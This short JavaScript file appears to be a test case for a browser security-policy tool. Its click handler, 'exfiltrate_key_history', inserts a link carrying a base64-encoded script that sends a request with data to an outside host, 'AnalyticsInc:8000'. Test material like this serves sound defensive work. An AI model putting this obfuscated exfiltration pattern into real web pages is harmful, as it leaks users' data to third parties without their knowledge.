
JAM.startProfile('load');
function exfiltrate_key_history() {
  var data$$18 = "PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNiIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var URL = "data:text/html;charset=utf-8;base64," + data$$18;
  var script = document.createElement("a");
  script.href = URL;
  script.innerHTML = "Suspicious Link";
  script.id = "mylink";
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  v0.appendChild(script);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
